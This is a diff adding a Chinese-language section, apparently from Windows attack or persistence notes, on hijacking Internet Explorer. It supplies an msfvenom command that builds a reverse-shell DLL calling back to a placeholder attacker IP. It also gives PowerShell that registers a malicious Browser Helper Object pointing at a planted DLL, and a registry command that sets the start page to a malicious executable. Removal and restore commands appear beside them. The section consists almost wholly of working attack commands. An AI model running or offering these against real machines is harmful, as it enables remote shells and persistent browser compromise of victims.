@@ -1131,3 +1131,47 @@ x86_64-w64-mingw32-g++ -O2 windows_event.cpp -o windows_event.exe -I /usr/share/
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /s
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v "MicrosoftRedirectionUrl" /t REG_SZ /d "http://go.microsoft.com/fwlink/events.asp" /f
 ```
+
+### IE浏览器劫持
+
+1、浏览器DLL劫持
+
+```Bash
+dir /b /s DLL文件名
+```
+
+```Bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f dll > suspend.dll
+```
+
+2、浏览器辅助对象劫持
+
+```powershell
+创建BHO的注册表项
+$BHO_GUID = "{12345678-1234-1234-1234-1234567890AB}"
+# 恶意DLL路径地址
+$BHO_Path = "C:\Users\Administrator\Desktop\test\malicious\pre\wolf.dll"
+
+# 注册BHO
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\$BHO_GUID" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\$BHO_GUID" -Name "Default" -Value "Malicious BHO"
+
+# 注册BHO的CLSID
+New-Item -Path "HKEY_CLASSES_ROOT\CLSID\$BHO_GUID" -Force
+Set-ItemProperty -Path "HKEY_CLASSES_ROOT\CLSID\$BHO_GUID" -Name "InprocServer32" -Value $BHO_Path
+Set-ItemProperty -Path "HKEY_CLASSES_ROOT\CLSID\$BHO_GUID\InprocServer32" -Name "ThreadingModel" -Value "Apartment"
+```
+
+```powershell
+Get-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\*"
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\注册的BHO_GUID" -Force
+Remove-Item -Path "HKCR:\CLSID\注册的BHO_GUID" -Force
+```
+
+3、修改启动页面
+
+```powershell
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "file://恶意可执行程序" /f
+reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main" /s
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "about:blank" /f
+```
